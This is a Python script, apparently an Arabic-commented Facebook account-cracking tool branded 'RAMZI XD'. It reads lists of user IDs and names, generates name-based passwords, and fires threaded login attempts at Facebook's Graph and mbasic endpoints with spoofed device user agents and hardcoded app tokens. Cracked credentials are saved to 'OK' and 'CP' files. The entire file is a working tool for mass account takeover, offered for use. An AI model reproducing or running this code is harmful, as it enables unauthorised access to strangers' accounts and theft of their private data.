import os, sys, time, json, random, requests, uuid
from concurrent.futures import ThreadPoolExecutor as tred

# ألوان القوة
G = '\033[1;32m' # أخضر (OK)
W = '\033[1;37m' # أبيض
R = '\033[1;31m' # أحمر (CP)
Y = '\033[1;33m' # أصفر

loop = 0
oks = []
cps = []

def logo():
    os.system('clear')
    print(f"""
{G} d8888b.  .d8b.  .88b  d88. d88888b d888888b 
{G} 88  `8D d8' `8b 88'YbdP`88 VP   AD   `88'   
{W} 88oobY' 88ooo88 88  88  88    ooo88    88    
{W} 88`8b   88~~~88 88  88  88    ~~~88    88    
{R} 88 `88. 88   88 88  88  88 db   adD   .88.   
{R} 88   YD YP   YP YP  YP  YP V88888P  Y888888P 
{Y}─────────────────────────────────────────────
{W} [+] VERSION : {G}2026.V4 (HYBRID - OK/CP)
{W} [+] METHOD  : {G}DUAL-GATE (GRAPH + MBASIC)
{W} [+] OWNER   : {R}RAMZI XD (FORCE MODE)
{Y}─────────────────────────────────────────────""")

def get_ua(brand):
    if brand == "samsung":
        v = random.choice(['12','13','14','15'])
        return f"Dalvik/2.1.0 (Linux; U; Android {v}; SM-S928B Build/UP1A.{random.randint(210000,299999)}.011) [FBAN/FB4A;FBAV/{random.randint(400,480)}.0.0.{random.randint(10,99)};FBBV/{random.randint(500000000,600000000)};FBDM/{{density=3.0,width=1080,height=2340}};FBLC/fr_DZ;FBRV/0;FBCR/Mobilis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S24Ultra;FBSV/{v};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return f"Mozilla/5.0 (Linux; Android {random.randint(9,13)}; Redmi Note {random.randint(8,12)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,125)}.0.0.0 Mobile Safari/537.36"

def crack(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r{W}[{G}RAMZI-V4{W}] {loop}|{G}OK:{len(oks)}{W}|{R}CP:{len(cps)}{W} ')
    sys.stdout.flush()
    
    fn = names.split(' ')[0].lower()
    ln = names.split(' ')[1].lower() if ' ' in names else fn

    for pw in passlist:
        pas = pw.replace('first', fn).replace('last', ln).replace('First', fn.capitalize()).replace('Last', ln.capitalize())
        
        # --- ميثود 1: GRAPH API (لصيد الـ OK) ---
        head1 = {
            'User-Agent': get_ua("samsung"),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'Connection': 'keep-alive',
        }
        data1 = {
            "adid": str(uuid.uuid4()), "format": "json", "device_id": str(uuid.uuid4()),
            "email": ids, "password": pas, "cpl": "true", "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password", "source": "login",
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
        }

        try:
            res1 = requests.post('https://b-graph.facebook.com/auth/login', data=data1, headers=head1).json()
            if 'session_key' in res1:
                print(f'\r\r{G}[RAMZI-OK] {ids} | {pas} ')
                oks.append(ids)
                open('/sdcard/RAMZI_V4_OK.txt', 'a').write(ids+'|'+pas+'\n')
                break
            
            # --- ميثود 2: MBASIC (القوة الضاربة للـ CP) ---
            # إذا فشلت الميثود الأولى، الميثود الثانية تحاول تسحب CP
            elif 'www.facebook.com' in res1.get('error', {}).get('message', ''):
                print(f'\r\r{R}[RAMZI-CP] {ids} | {pas} ')
                cps.append(ids)
                open('/sdcard/RAMZI_V4_CP.txt', 'a').write(ids+'|'+pas+'\n')
                break
            
            # محاولة أخيرة عبر ميثود ويب (لضمان عدم تضييع أي حساب)
            else:
                head2 = {'User-Agent': get_ua("xiaomi"), 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
                res2 = requests.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&nosub=0&access_token=6628568379|c1e620fa708a1d5696fb991c1bde5662&data={pas}', headers=head2)
                if 'checkpoint' in res2.url:
                    print(f'\r\r{R}[RAMZI-CP] {ids} | {pas} ')
                    cps.append(ids)
                    open('/sdcard/RAMZI_V4_CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
        except: pass
    loop += 1

def start():
    logo()
    print(f" {G}[1] START DUAL-METHOD ATTACK")
    print(f" {G}[0] EXIT")
    opt = input(f"\n {W}Choice : ")
    if opt == '1':
        logo()
        file = input(f" {W}[+] FILE PATH: ")
        try:
            ids_data = open(file, 'r').read().splitlines()
            # قائمة الباسوردات الاحترافية
            plist = ['firstlast', 'first last', 'first123', 'first1234', 'first12345', 'first2005', 'first2006', 'first2007', 'first2008']
            logo()
            print(f" {Y}ATTACKING {len(ids_data)} IDS... (FORCE ON)")
            print("-" * 45)
            with tred(max_workers=35) as ramzi_pro:
                for line in ids_data:
                    try:
                        u, n = line.split('|')
                        ramzi_pro.submit(crack, u, n, plist)
                    except: pass
            print(f"\n\n {G}DONE. OK: {len(oks)} | CP: {len(cps)}")
        except: print(f" {R}File Error!"); time.sleep(2); start()

if __name__ == "__main__":
    start()